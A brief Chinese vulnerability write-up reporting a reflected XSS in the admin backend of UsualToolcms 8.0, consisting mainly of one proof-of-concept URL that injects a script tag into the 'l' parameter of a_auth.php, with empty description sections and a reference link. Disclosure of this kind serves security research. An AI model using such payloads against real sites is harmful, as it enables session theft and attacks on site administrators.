UsualToolcms 8.0 后台反射型XSS
==============================

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

![1.png](./.resource/UsualToolcms8.0后台反射型XSS/media/rId24.png)

### poc

    https://www.0-sec.org/cmsadmin/a_auth.php?do=update&l=%22%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

![2.png](./.resource/UsualToolcms8.0后台反射型XSS/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
